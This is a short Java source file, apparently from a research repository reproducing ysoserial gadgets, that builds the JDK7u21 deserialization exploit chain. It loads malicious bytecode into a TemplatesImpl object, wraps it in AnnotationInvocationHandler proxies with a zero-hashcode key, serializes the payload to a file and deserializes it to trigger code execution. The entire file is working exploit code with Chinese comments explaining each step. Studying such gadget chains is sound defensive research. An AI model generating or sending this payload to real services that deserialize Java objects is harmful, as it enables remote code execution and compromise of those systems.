package org.su18.serialize.ysoserial.JDK7u21;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.su18.serialize.utils.SerializeUtil;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.LinkedHashSet;

/**
 * @author su18
 */
public class Jdk7u21 {

	public static void main(String[] args) throws Exception {

		// 生成包含恶意类字节码的 TemplatesImpl 类
		final TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();

		// hashCode 为 0 的字符串
		String zeroHashCodeStr = "f5a5a608";

		HashMap map = new HashMap();
		map.put(zeroHashCodeStr, "foo");

		// 使用 AnnotationInvocationHandler 为 HashMap 创建动态代理
		Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor<?> constructor = c.getDeclaredConstructors()[0];
		constructor.setAccessible(true);
		InvocationHandler tempHandler = (InvocationHandler) constructor.newInstance(Override.class, map);

		// 反射写入 AnnotationInvocationHandler 的 type
		Field field = c.getDeclaredField("type");
		field.setAccessible(true);
		field.set(tempHandler, Templates.class);

		// 为 Templates 创建动态代理
		Templates proxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
				new Class[]{Templates.class}, tempHandler);

		// LinkedHashSet 中放入 TemplatesImpl 以及动态代理类
		LinkedHashSet set = new LinkedHashSet(); // maintain order
		set.add(tmpl);
		set.add(proxy);

		// 反射将 _auxClasses 和 _class 修改为 null
		Field field2 = TemplatesImpl.class.getDeclaredField("_auxClasses");
		field2.setAccessible(true);
		field2.set(tmpl, null);

		Field field3 = TemplatesImpl.class.getDeclaredField("_class");
		field3.setAccessible(true);
		field3.set(tmpl, null);

		// 向 map 中替换 tmpl 对象
		map.put(zeroHashCodeStr, tmpl);

		SerializeUtil.writeObjectToFile(set);
		SerializeUtil.readFileObject();
	}

}
